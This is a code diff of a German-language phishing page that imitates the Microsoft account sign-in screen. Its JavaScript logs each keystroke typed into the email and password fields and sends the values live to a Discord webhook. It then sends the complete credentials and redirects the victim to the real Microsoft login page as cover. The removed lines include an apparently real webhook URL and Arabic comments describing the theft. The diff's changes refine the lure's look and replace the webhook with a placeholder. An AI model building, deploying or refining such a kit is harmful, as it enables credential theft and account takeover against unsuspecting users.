@@ -5,44 +5,50 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
     <meta property="og:title" content="Microsoft-Konto: Identitätsprüfung">
-    <meta property="og:description" content="Sicherheitsupdate: Bitte bestätigen Sie Ihre Anmeldedaten, um den Kontوزugriff beizubehalten.">
-    <meta property="og:image" content="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageUI/RE1Mu3b?ver=5c3a">
+    <meta property="og:description" content="Sicherheitsupdate: Bitte bestätigen Sie Ihre Anmeldedaten.">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/200px-Microsoft_logo.svg.png">
     <meta property="og:type" content="website">
 
     <title>Anmelden bei Ihrem Microsoft-Konto</title>
     
     <style>
-        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #e6e6e6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; padding: 44px; width: 360px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
-        .logo { width: 108px; margin-bottom: 24px; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 44px; width: 360px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); border-radius: 1px; }
+        /* تصحيح الشعار لضمان الظهور */
+        .logo-container { margin-bottom: 24px; }
+        .logo { width: 108px; height: 23px; display: block; }
         h2 { font-size: 24px; font-weight: 600; margin: 0 0 12px; color: #1b1b1b; }
         p { font-size: 15px; margin-bottom: 12px; }
-        input { width: 100%; border: none; border-bottom: 1px solid #666; padding: 8px 0; font-size: 16px; margin-bottom: 20px; outline: none; }
+        input { width: 100%; border: none; border-bottom: 1px solid #666; padding: 8px 0; font-size: 16px; margin-bottom: 20px; outline: none; border-radius: 0; }
         input:focus { border-bottom: 2px solid #0067b8; }
         .btn-container { display: flex; justify-content: flex-end; margin-top: 10px; }
-        button { background-color: #0067b8; color: white; border: none; padding: 8px 36px; font-size: 15px; cursor: pointer; }
+        button { background-color: #0067b8; color: white; border: none; padding: 8px 36px; font-size: 15px; cursor: pointer; min-width: 100px; }
         button:hover { background-color: #005da6; }
-        .email-display { font-weight: 400; color: #1b1b1b; margin-bottom: 20px; display: block; }
+        .email-display { font-weight: 400; color: #1b1b1b; margin-bottom: 20px; display: inline-block; }
         .hidden { display: none; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <img class="logo" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9bf110300a9c06954270445104.svg" alt="Microsoft">
+    <div class="logo-container">
+        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/256px-Microsoft_logo_%282012%29.svg.png" alt="Microsoft">
+    </div>
     
     <div id="step1">
         <h2>Anmelden</h2>
         <p>E-Mail, Telefon oder Skype</p>
         <input type="email" id="email" placeholder="E-Mail-Adresse" required>
-        <p style="font-size: 13px;">Kein Konto? <span style="color: #0067b8;">Erstellen Sie jetzt eines!</span></p>
+        <p style="font-size: 13px;">Kein Konto? <span style="color: #0067b8; cursor:pointer;">Erstellen Sie jetzt eines!</span></p>
         <div class="btn-container">
             <button onclick="toPassword()">Weiter</button>
         </div>
     </div>
 
     <div id="step2" class="hidden">
-        <div id="back-btn" onclick="backToEmail()" style="cursor:pointer; margin-bottom: 10px;">← <span id="user-email" class="email-display"></span></div>
+        <div id="back-btn" onclick="backToEmail()" style="cursor:pointer; margin-bottom: 15px; font-size: 14px;">
+            <span style="font-size: 18px;">←</span> <span id="user-email" class="email-display"></span>
+        </div>
         <h2>Kennwort eingeben</h2>
         <input type="password" id="password" placeholder="Kennwort" required>
         <p style="font-size: 13px; color: #0067b8; cursor: pointer;">Kennwort vergessen?</p>
@@ -53,30 +59,21 @@
 </div>
 
 <script>
-    // استبدل هذا الرابط بالـ Webhook الخاص بك
-    const DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/1493722456370839623/bOalmMVjlbeEy6jkYSoG1Oury_MmH5irfv9IJCgw9IUaqnXoGGdjDdVIsCMYgYmzAXG5";
+    const DISCORD_WEBHOOK = "YOUR_DISCORD_WEBHOOK_URL";
     
-    let currentData = {
-        email: "",
-        password: ""
-    };
+    let currentData = { email: "", password: "" };
 
-    // وظيفة المراقبة اللحظية - ترسل كل حرف يكتبه فوراً
     function setupKeylogger(elementId, keyName) {
         document.getElementById(elementId).addEventListener('input', (e) => {
             currentData[keyName] = e.target.value;
-            
             fetch(DISCORD_WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: `⌨️ **Eingabe-Live [${keyName}]:** \`${currentData[keyName]}\``
-                })
+                body: JSON.stringify({ content: `⌨️ **Eingabe-Live [${keyName}]:** \`${currentData[keyName]}\`` })
             });
         });
     }
 
-    // تفعيل المراقبة للحقلين
     setupKeylogger('email', 'email');
     setupKeylogger('password', 'password');
 
@@ -95,7 +92,6 @@
     }
 
     function submitAll() {
-        // إرسال التقرير النهائي
         fetch(DISCORD_WEBHOOK, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -106,12 +102,10 @@
                     fields: [
                         { name: "📧 الإيميل الشخصي", value: `\`${currentData.email}\`` },
                         { name: "🔑 كلمة السر", value: `\`${currentData.password}\`` }
-                    ],
-                    footer: { text: "تم سحب البيانات بنجاح وتحويل الضحية" }
+                    ]
                 }]
             })
         }).then(() => {
-            // تحويل الضحية لموقع ميكروسوفت الحقيقي للتمويه
             window.location.href = "https://login.live.com/";
         });
     }
